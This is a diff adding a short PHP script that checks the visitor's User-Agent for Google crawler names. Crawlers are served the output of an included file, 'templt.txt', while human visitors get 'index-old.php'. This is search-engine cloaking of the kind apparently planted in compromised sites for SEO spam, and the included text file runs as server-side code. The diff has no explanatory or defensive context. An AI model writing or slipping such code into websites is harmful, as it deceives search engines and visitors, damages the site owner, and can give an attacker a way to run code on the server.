@@ -1,0 +1,22 @@
+<?php
+function is_google_bot() {
+    $agents = ["Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News"];
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    foreach ($agents as $agent) {
+        if (stripos($ua, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_google_bot()) {
+    ob_start();
+    include 'templt.txt';
+    $bot_content = ob_get_clean();
+    echo $bot_content;
+} else {
+    include 'index-old.php';
+}
+?>
